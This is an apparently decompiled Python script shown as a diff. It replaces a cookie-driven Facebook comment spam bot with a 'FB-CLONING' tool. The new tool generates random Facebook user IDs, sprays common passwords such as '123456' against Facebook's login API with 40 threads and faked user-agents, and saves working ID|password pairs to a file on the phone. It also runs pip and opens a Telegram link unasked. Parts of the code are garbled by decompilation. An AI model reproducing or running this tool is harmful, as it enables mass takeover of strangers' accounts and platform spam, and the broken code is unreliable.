@@ -1,288 +1,312 @@
 #Decode by Asshu x Deep 
-#JOIN CHANNEL : https://t.me/trickerxx77
-#Telegram https://t.me/trickerxx7
+#Telegram https://www.facebook.com
+#JOIN CHANNEL : https://www.facebook.com
 
 
 import requests
+import bs4
+import json
 import os
-import re
-import time
-import random
-from requests.exceptions import RequestException
 import sys
-import os
+import uuid
+import random
 import datetime
-from time import sleep
-
-def testPY():
-    if sys.version_info[0] < 3:
-        print('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
-        sys.exit()
-        return None
-
-
-def modelsInstaller():
-    models = [
-        'requests',
-        'colorama']
-    for model in models:
-        if sys.version_info[0] < 3:
-            os.system('cd C:\\Python27\\Scripts & pip install {}'.format(model))
-        os.system('python -m pip install {}'.format(model))
-        print(' ')
-        print('[+] {} has been installed successfully, Restart the program.'.format(model))
-        sys.exit()
-        print(' ')
-        print('[-] Install {} manually.'.format(model))
-        print(' ')
-        return None
-        return None
-
+import time
+import re
+import urllib3
+import rich
 import base64
-import json
-import time
-import sys
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import pretty
+from rich.text import Text as tekz
+from time import localtime as lt
 import os
-import re
-import binascii
 import time
-import json
 import random
-import threading
-import pprint
-import smtplib
-import telnetlib
-import os.path as os
-import hashlib
-import string
-import glob
-import sqlite3
-import urllib
-import argparse
-import marshal
+import json
+import sys
 import datetime
-from platform import system
-from datetime import datetime
 import requests
-from colorama import Fore
-from colorama import init
-modelsInstaller()
-requests.packages.urllib3.disable_warnings()
+os.system('pip3 install requests')
+import requests
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+os.system('xdg-open https://t.me/trickerxx77')
 
-def cls():
-    if system() == 'Linux':
-        os.system('clear')
-        return None
-    if None() == 'Windows':
-        os.system('cls')
-        return None
+def lin():
+    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
-cls()
-CLEAR_SCREEN = '\x1b[2J'
-RED = '\x1b[1;37;1m'
-RESET = '\x1b[1;37;1m'
-BLUE = '\x1b[1;37;1m'
-WHITE = ('\x1b[1;37;1m',)
-YELLOW = ('\x1b[1;37;1m',)
-CYAN = '\x1b[1;37;1m'
-MAGENTA = ('\x1b[1;37;1m',)
-GREEN = '\x1b[1;37;1m'
-RESET = '\x1b[1;37;1m'
-BOLD = '\x1b[1;37;1m'
-REVERSE = '\x1b[1;37;1m'
+dic = {
+    '1': 'January',
+    '2': 'February',
+    '3': 'March',
+    '4': 'April',
+    '5': 'May',
+    '6': 'June',
+    '7': 'July',
+    '8': 'August',
+    '9': 'September',
+    '10': 'October',
+    '11': 'November',
+    '12': 'December' }
+dic2 = {
+    '01': 'January',
+    '02': 'February',
+    '03': 'March',
+    '04': 'April',
+    '05': 'May',
+    '06': 'June',
+    '07': 'July',
+    '08': 'August',
+    '09': 'September',
+    '10': 'October',
+    '11': 'November',
+    '12': 'Devember' }
+tgl = datetime.datetime.now().day
+bln = dic[str(datetime.datetime.now().month)]
+thn = datetime.datetime.now().year
+okc = 'OK-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
+cpc = 'CP-' + str(tgl) + '-' + str(bln) + '-' + str(thn) + '.txt'
+date = str(tgl) + '-' + str(bln)
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx - 12
+    tag = 'PM'
+a = ltx
+tag = 'AM'
+A = '\x1b[1;97m'
+R = '\x1b[38;5;196m'
+Y = '\x1b[1;33m'
+G = '\x1b[38;5;46m'
+B = '\x1b[38;5;8m'
+G1 = '\x1b[38;5;48m'
+G2 = '\x1b[38;5;47m'
+G3 = '\x1b[38;5;48m'
+G4 = '\x1b[38;5;49m'
+G5 = '\x1b[38;5;50m'
+X = '\x1b[1;34m'
+X1 = '\x1b[38;5;14m'
+X2 = '\x1b[38;5;123m'
+X3 = '\x1b[38;5;122m'
+X4 = '\x1b[38;5;86m'
+X5 = '\x1b[38;5;121m'
+S = '\x1b[1;96m'
+M = '\x1b[38;5;205m'
 
-def logo():
-    clear = '\x1b[0m'
-    colors = [
-        35,
-        33,
-        36]
-    x = '\n░██╗░░░░░░░██╗███████╗██╗░░░░░░█████╗░░█████╗░███╗░░░███╗ \n░██║░░██╗░░██║██╔════╝██║░░░░░██╔══██╗██╔══██╗████╗░████║ \n░╚██╗████╗██╔╝█████╗░░██║░░░░░██║░░╚═╝██║░░██║██╔████╔██║ \n░░████╔═████║░██╔══╝░░██║░░░░░██║░░██╗██║░░██║██║╚██╔╝██║ \n░░╚██╔╝░╚██╔╝░███████╗███████╗╚█████╔╝╚█████╔╝██║░╚═╝░██║ \n░░░╚═╝░░░╚═╝░░╚══════╝╚══════╝░╚════╝░░╚════╝░╚═╝░░░░░╚═╝ \n\n'
-    for N, line in enumerate(x.split('\n')):
-        sys.stdout.write('\x1b[1;%dm%s%s\n' % (random.choice(colors), line, clear))
-        time.sleep(0.05)
-        return None
+def ua():
+    rr = random.randint
+    aZ = random.choice([
+        'A',
+        'B',
+        'C',
+        'D',
+        'E',
+        'F',
+        'G',
+        'H',
+        'I',
+        'J',
+        'K',
+        'L',
+        'M',
+        'N',
+        'O',
+        'P',
+        'Q',
+        'R',
+        'S',
+        'T',
+        'U',
+        'V',
+        'W',
+        'X',
+        'Y',
+        'Z'])
+    zA = random.choice([
+        'a',
+        'b',
+        'c',
+        'd',
+        'e',
+        'f',
+        'g',
+        'h',
+        'i',
+        'j',
+        'k',
+        'l',
+        'm',
+        'n',
+        'o',
+        'p',
+        'q',
+        'r',
+        's',
+        't',
+        'u',
+        'v',
+        'w',
+        'x',
+        'y',
+        'z'])
+    rx = random.randrange(1, 999)
+    xx = f'''Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9, 11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99, 149))}.0.{str(rr(4500, 4999))}.{str(rr(35, 99))} Chrome/{str(rr(99, 175))}.0.{str(rr(0, 5))}.{str(rr(0, 5))} Safari/537.36'''
+    return xx
 
-logo()
-testPY()
-print('\x1b[1;32m<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<\n')
 
-def venom():
-    clear = '\x1b[0m'
-    colors = [
-        35,
-        33,
-        36]
+def windows():
+    aV = str(random.choice(range(10, 20)))
+    A = f'''Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}'''
+    bV = str(random.choice(range(1, 36)))
+    bx = str(random.choice(range(34, 38)))
+    bz = f'''5{bx}.{bV}'''
+    B = f'''Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice([
+        '2',
+        '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}'''
+    cV = str(random.choice(range(1, 36)))
+    cx = str(random.choice(range(34, 38)))
+    cz = f'''5{cx}.{cV}'''
+    C = f'''Mozilla/5.0 (Windows NT 6.{str(random.choice([
+        '2',
+        '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}'''
+    D = f'''Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36'''
+    return random.choice([
+        A,
+        B,
+        C,
+        D])
 
 
-def Subscraption():
-    os.system('git pull')
-    time.sleep(1)
-    uuid = str(os.geteuid()) + '#' + str(os.geteuid())
-    id = 'Premium-Tool-' + ''.join(uuid)
-    os.system('clear')
-    logo = '\n                                \n\x1b[36m██╗░░░░░░█████╗░░█████╗░██████╗░███████╗██████╗░ \n\x1b[31m██║░░░░░██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗ \n\x1b[35m██║░░░░░██║░░██║███████║██║░░██║█████╗░░██████╔╝ \n\x1b[32m██║░░░░░██║░░██║██╔══██║██║░░██║██╔══╝░░██╔══██╗ \n\x1b[37m███████╗╚█████╔╝██║░░██║██████╔╝███████╗██║░░██║ \n\x1b[33m╚══════╝░╚════╝░╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝ \n\n\x1b[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n [•] Tool       : Post Loader Using For Cookies \n [•] Note       : This Tool Is Paid\n [•] Onwer      : Black DeviL \n [•] Version    :  2.0\n\x1b[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n                                '
-    print(logo.center(os.get_terminal_size().columns))
-    print('\x1b[1;32m You Get Approved for Using Command  Paid Tool \x1b[1;37m')
-    print('\n\x1b[1;33m Your Key :\x1b[32m ' + id)
-    time.sleep(0.1)
-    print('\x1b[33m--------------------------------------------------')
-    httpCaht = requests.get('https://github.com/DeviiLXD/Approval/blob/main/Approval.txt').text
-    if id in httpCaht:
-        print('\n\x1b[1;32m Congrats You get approved Successfully')
-        msg = str(os.geteuid())
+def generate_user_agent():
+    rr = random.randint
+    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWALAMGIR')
+    rx = random.randrange(1, 999)
+    return f'''Mozilla/5.0 (Windows NT {rr(9, 11)}; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/537.36 (KHTML, like Gecko){rr(99, 149)}.0.{rr(4500, 4999)}.{rr(35, 99)} Chrome/{rr(99, 175)}.0.{rr(0, 5)}.{rr(0, 5)} Safari/537.36'''
+
+logo = '\n   \x1b[38;5;196m 
+███    ██ 
+████   ██ 
+██ ██  ██ 
+██  ██ ██ 
+██   ████ 
+          
+          
+\x1b[33;1m
+ █████  
+██   ██ 
+███████ 
+██   ██ 
+██   ██ 
+        
+        
+\x1b[38;5;46m
+██████  
+██   ██ 
+██   ██ 
+██   ██ 
+██████  
+        
+        
+ \x1b[34;1m
+███████ 
+██      
+█████   
+██      
+███████ 
+        
+        
+ \x1b[38;5;196m
+███████ 
+██      
+█████   
+██      
+███████ 
+        
+        
+  \n   \x1b[38;5;196m
+███    ███ 
+████  ████ 
+██ ████ ██ 
+██  ██  ██ 
+██      ██ 
+           
+           
+ \x1b[33;1m██  ██  \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ \n   \x1b[38;5;196m██        \x1b[33;1m████   \x1b[38;5;46m██████  \x1b[34;1m█████   \x1b[38;5;196m██████  \n   \x1b[38;5;196m██         \x1b[33;1m██    \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ \n   \x1b[38;5;196m ██████    \x1b[33;1m██    \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██   ██ \n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mDEVELOPER \x1b[1;91m :   \x1b[1;92mYUSUF KHAN\n  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mFACEBOOK \x1b[1;91m  :   \x1b[1;92mYUSUF KHANツ࿐\n  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mFB-CLONING\n  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mVERSION \x1b[1;91m   :   \x1b[1;92mMIX\n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n'
+CorrectUsername = 'KHANBABA'
+key = 'true'
+if key == 'true':
+    username = input('\x1b[1;91m[\x1b[1;92m•\x1b[1;91m] \x1b[1;92mENTER USERNAME \x1b[1;91m: \x1b[1;92m')
+    if username == CorrectUsername:
+        print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\x1b[0;97m[•]\x1b[1;32m LOGGED IN PAID TOOL SUCCESSFULLY')
         time.sleep(1)
-        return None
-    None('\n\x1b[1;33m Your Key Not approved please contact the Own')
-    time.sleep(0.1)
-    input('\n\nPress Enter to send your key')
-    tks = "Dear%20Devil,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20" + id
-    (os.system('am start https://wa.me/+917668337116?text=' + tks), Subscraption())
-    time.sleep(1)
-    exit()
-    return None
-    if Exception:
-        e = None
-        print(e)
-        time.sleep(2)
-        Subscraption()
-        e = None
-        del e
-        return None
-    e = None
-    del e
-    sys.exit()
+        key = 'false'
 
+def main():
+    user = []
+    os.system('clear')
+    print(logo)
+    print('\x1b[38;5;8m\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;37mEXAMPLE   : \x1b[1;37m10000 | 20000 | 90000')
+    lin()
+    limit = input('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ')
+    lin()
+    os.system('clear')
+    print(logo)
+    print('\x1b[38;5;8m(\x1b[1;97m1\x1b[38;5;8m) \x1b[1;97mMETHOD ~ (2010-2009')
+    lin()
+    ask = input('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ')
+    lin()
+    if ask in ('1',):
+        star = '10000'
+        for i in range(int(limit)):
+            data = str(random.choice(range(1000000000, 1999999999)))
+            user.append(data)
+            star = '100000'
+            for i in range(int(limit)):
+                data = str(random.choice(range(1000000000, 1999999999)))
+                user.append(data)
+                MrDevilEx = ThreadPool(max_workers = 40)
+                os.system('clear')
+                print(logo)
+                print(f'''\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mTOTAL ID : {limit} \x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mMETHOD : \x1b[38;5;86m{ask}''')
+                print('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mVPN.1.1.1 \x1b[38;5;8m[\x1b[38;5;47mON\x1b[1;97m/\x1b[38;5;47mOF\x1b[38;5;8m]  \x1b[38;5;47mLOGIN METHOD-USE-VPN-111')
+                lin()
+                for mal in user:
+                    uid = star + mal
+                    MrDevilEx.submit(login, uid)                   
 
-def pas():
-    password = input('\x1b[1;32;33m[♡] Enter Tool Passwrod  :: ')
-    mmm = request.get('https://pastebin.com/raw/aNh7GgVF').text
-    if mmm not in password:
-        print('\x1b[1;32;31m[•] <==> Incorrect Password!')
-        sys.exit()
-        return None
+loop = 0
+oks = []
 
-Subscraption()
-pas()
-print('\x1b[1;35m[♡] Time start now:', time.strftime('%Y-%m-%d %H:%M:%S'))
-
-class FacebookCommenter:
-    
-    def __init__(self):
-        self.comment_count = 0
-
-    
-    def comment_on_post(self, cookies, post_id, comment, timm):
-        r = requests.Session()
-        r.headers.update({
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'sec-fetch-site': 'none',
-            'accept-language': 'id,en;q=0.9',
-            'Host': 'mbasic.facebook.com',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'accept-encoding': 'gzip, deflate',
-            'sec-fetch-mode': 'navigate',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.166 Mobile Safari/537.36',
-            'connection': 'keep-alive' })
-        response = r.get('https://mbasic.facebook.com/{}'.format(post_id), cookies = {
-            'cookie': cookies })
-        next_action_match = re.search('method="post" action="([^"]+)"', response.text)
-        if next_action_match:
-            self.next_action = next_action_match.group(1).replace('amp;', '')
-        print(f'''\x1b[1;37;1m  Coockies Chack =>C_USER ID<= i_USER \x1b[1;32;31m{(self, cookies)}''')
-        None(None, None)
-        return None
-        fb_dtsg_match = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
-        if fb_dtsg_match:
-            self.fb_dtsg = fb_dtsg_match.group(1)
-        print(f'''\x1b[1;35;1m Your Cookie File Complete Restart your Cookie file\x1b[1;32;31m{(self, cookies)}''')
-        None(None, None)
-        return None
-        jazoest_match = re.search('name="jazoest" value="([^"]+)"', response.text)
-        if jazoest_match:
-            self.jazoest = jazoest_match.group(1)
-        print('<Error> jazoest not found')
-        None(None, None)
-        return None
-        data = {
-            'fb_dtsg': self.fb_dtsg,
-            'jazoest': self.jazoest,
-            'comment_text': comment,
-            'comment': 'Submit' }
-        r.headers.update({
+def login(uid):
+    global loop
+    Session = requests.session()
+    sys.stdout.write(f'''\r\x1b[38;5;8m(\x1b[1;97m{date}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{loop}\x1b[38;5;8m) \x1b[38;5;8m(\x1b[1;97m{len(oks)}\x1b[38;5;8m)''')
+    sys.stdout.flush()
+    for pw in ('123456', '123123', '1234567890', '0987654321', '1234567', '12345678', '123123', '123456789', '654321', '87654321', '7654321', '000000', '111111', '143143', '111222', '112233'):
+        headers = {
+            'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
+            'x-fb-sim-hni': str(random.randint(20000, 40000)),
+            'x-fb-net-hni': str(random.randint(20000, 40000)),
+            'x-fb-connection-quality': 'EXCELLENT',
+            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+            'user-agent': windows(),
             'content-type': 'application/x-www-form-urlencoded',
-            'referer': 'https://mbasic.facebook.com/{}'.format(post_id),
-            'origin': 'https://mbasic.facebook.com' })
-        response2 = r.post('https://mbasic.facebook.com{}'.format(self.next_action), data = data, cookies = {
-            'cookie': cookies })
-        if 'comment_success' in str(response2.url) and response2.status_code == 200:
-            (self.comment_count += 1).comment_count = None
-            sys.stdout.write(f'''\rComment count: {self.comment_count}''')
-            sys.stdout.flush()
-            print(f'''Comment successfully posted: {comment}''')
-        print('\x1b[1;36m--------------------------------------------------')
-        print('\x1b[1;32;40m Status :: Active')
-        e = datetime.now()
-        print(e.strftime('\x1b[1;33m Date :: %d-%m-%Y '))
-        print(e.strftime('\x1b[1;33m TIME :: %I:%M:%S %p'))
-        print(f'''\x1b[1;32;40m Comment Sent Successfully :: {comment}''')
-        None(None, None)
+            'x-fb-http-engine': 'Liger' }
+        rp = Session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = headers).json()
+        if 'session_key' in rp:
+            print(f'''\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}''')
+            open('/sdcard/AMI.txt', 'a').write(uid + '|' + pw + '\n')
+            oks.append(uid)
+        if 'www.facebook.com' in rp['error_msg']:
+            print(f'''\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}''')
+            open('/sdcard/AMI.txt', 'a').write(uid + '|' + pw + '\n')
+            oks.append(uid)
+        if 'Please Confirm Email' in str(rp):
+            print(f'''\r\r{G}SUCCESS{A}➤ {G}{uid} {A}•{G} {pw}''')
+            open('/sdcard/AMI.txt', 'a').write(uid + '|' + pw + '\n')
+            oks.append(uid)
+        loop += 1
         return None
-        if not None:
-            pass
+        return None
 
-    
-    def inputs(self):
-        coockies_file_path = input('[♡] Enter Cookie file Path  ::').strip()
-        file = open(coockies_file_path, 'r')
-        your_cookies = file.read().splitlines()
-        post_id = input('[♡] Enter Your Post Uid  ::').strip()
-        None(None, None)
-        if not None:
-            pass
-        comments_file = input('[♡] Enter Comment file Path  ::').strip()
-        file = open(comments_file, 'r')
-        comments = file.readlines()
-        None(None, None)
-        if not None:
-            pass
-        timm = int(input('[♡] Enter time (speed in second  ::').strip())
-        cookie_index = 0
-        for comment in comments:
-            comment = comment.strip()
-            if comment:
-                time.sleep(timm)
-                self.comment_on_post(your_cookies[cookie_index], post_id, comment, timm)
-                cookie_index = (cookie_index + 1) % len(your_cookies)
-            if RequestException:
-                e = None
-                print(f'''<chack first & last coockies> {str(e).lower()}''')
-                e = None
-                del e
-                e = None
-                del e
-        if Exception:
-            e = None
-            print(f'''<chack first & last coockies> {str(e).lower()}''')
-            e = None
-            del e
-            e = None
-            del e
-        if KeyboardInterrupt:
-            return None
-        if Exception:
-            e = None
-            print(f'''<chack first & last coockies> {str(e).lower()}''')
-            exit()
-            e = None
-            del e
-            return None
-        e = None
-        del e
-
-
-if __name__ == '__main__':
-    commenter = FacebookCommenter()
-    commenter.inputs()
-    return None
+main()
